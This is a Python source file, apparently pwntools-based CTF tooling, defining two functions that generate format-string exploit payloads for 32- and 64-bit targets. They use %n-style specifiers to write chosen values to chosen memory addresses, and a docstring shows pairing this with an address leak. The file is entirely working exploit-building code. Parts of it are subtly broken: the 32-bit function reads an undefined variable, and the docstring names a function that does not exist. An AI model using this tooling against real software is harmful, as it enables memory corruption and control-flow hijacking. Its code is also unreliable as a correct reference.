
from pwn import*

def fmt_payload32(list_data,dword_of_rsp_fmt = 0,wide='$hhn',prefix= b'',prefix_outlen= 0):
    
    _len = len(list_data)
    arg_start = dword_of_esp_fmt
    
    bits = 8

    if wide == '$hhn':
        bits = 8
    if wide == '$hn':
        bits = 16
    if wide == '$n':
        bits = 32
    if wide == '$ln':
        bits = 64
    
    mask = 0x0
    for i in range(bits):
        mask = (mask<<1)|1
    
    parts = []      #(addr,val)
    #save to list
    for i in range(_len):
        size = list_data[i][2]
        value = list_data[i][1]
        addr = list_data[i][0]
        
        c = size//(bits//8)
        if c == 0:
        	c = 1
        
        for j in range(c):
            part_addr = addr + j * (bits//8)
            part_val = (value>>(j * bits)) & mask
            parts.append((part_addr,part_val))

    #sort by val 
    for i in range(len(parts)):
        for j in range(i+1,len(parts)):
            if(parts[j][1]<parts[i][1]):
                tmp = parts[i]
                parts[i] = parts[j]
                parts[j] = tmp

    #generate fmt payload
    payload = b''
    fmt_string_len = 0
    generate_success = False

    if parts[0][1] < prefix_outlen:
        print('Error: prefix_outlen is longger than low bytes count.')
        return None

    while False == generate_success:
        inc_len = False
        payload = prefix

        for i in range(len(parts)):
            if i==0:
                if parts[0][1] != 0:
                    payload += b'%%%dc'%(parts[0][1] - prefix_outlen)
            else:
                if (parts[i][1]-parts[i-1][1]) != 0:
                    payload += b'%%%dc'%(parts[i][1] - parts[i-1][1])

            tmp = payload + b'%' + str(i + arg_start + fmt_string_len//4).encode() + wide.encode()
            
            if len(tmp) >= fmt_string_len:
                fmt_string_len += 4             #一次加一个dword
                inc_len = True   
                break
            else:
                payload += b'%' + str(i + arg_start + fmt_string_len//4).encode() + wide.encode()
        if inc_len == False:
            generate_success = True
    payload = payload.ljust(fmt_string_len,b'\x00')
    print(parts)

    for i in range(len(parts)):
         payload += p32(parts[i][0])

    return payload

'''
    list_data : [
        (addr,val,Number Of Write Bytes)
    ]

    qword_of_rsp_fmt: (fmrstr - rsp )//8

    wide: '$hhn','$hn','$n',....

    prefix: the prefix of fmtstr

    prefix_outlen: printf out len.

    Example:
        payload = fmt_payload64_with_prefix(prefix=b'%512$p',prefix_outlen = len('0x7ffff7fd15e0'),
            qword_of_rsp_fmt = 0,list_data = write_,wide='$hhn')

        leak data and write value to target address.
'''
def fmt_payload64(list_data,qword_of_rsp_fmt = 0,wide='$hhn',prefix= b'',prefix_outlen= 0):
    _len = len(list_data)
    arg_start = 5 + qword_of_rsp_fmt + 1
    bits = 8

    if wide == '$hhn':
        bits = 8
    if wide == '$hn':
        bits = 16
    if wide == '$n':
        bits = 32
    if wide == '$ln':
        bits = 64
    
    mask = 0x0
    for i in range(bits):
        mask = (mask<<1)|1
    
    parts = []      #(addr,val)
    #save to list
    for i in range(_len):
        size = list_data[i][2]
        value = list_data[i][1]
        addr = list_data[i][0]
        
        c = size//(bits//8)
        if c == 0:
        	c = 1
        
        for j in range(c):
            part_addr = addr + j * (bits//8)
            part_val = (value>>(j * bits)) & mask
            parts.append((part_addr,part_val))

    #sort by val 

    for i in range(len(parts)):
        for j in range(i+1,len(parts)):
            if(parts[j][1]<parts[i][1]):
                tmp = parts[i]
                parts[i] = parts[j]
                parts[j] = tmp

    #generate fmt payload
    payload = b''                    #
    fmt_string_len = 0      #
    generate_success = False

    if parts[0][1] < prefix_outlen:
        print('Error: prefix_outlen is longger than low bytes count.')
        return None
    
    while False == generate_success:
        inc_len = False
        payload = prefix

        for i in range(len(parts)):
            if i==0:
                if parts[0][1] != 0:
                    payload += b'%%%dc'%(parts[0][1] - prefix_outlen)
            else:
                if (parts[i][1]-parts[i-1][1]) != 0:
                    payload += b'%%%dc'%(parts[i][1] - parts[i-1][1])

            tmp = payload + b'%' + str(i + arg_start + fmt_string_len//8).encode() + wide.encode()
            
            if len(tmp) >= fmt_string_len:
                fmt_string_len += 8
                inc_len = True   
                break
            else:
                payload += b'%' + str(i + arg_start + fmt_string_len//8).encode() + wide.encode()
        if inc_len == False:
            generate_success = True
    payload = payload.ljust(fmt_string_len,b'\x00')
    print(parts)

    for i in range(len(parts)):
         payload += p64(parts[i][0])

    return payload

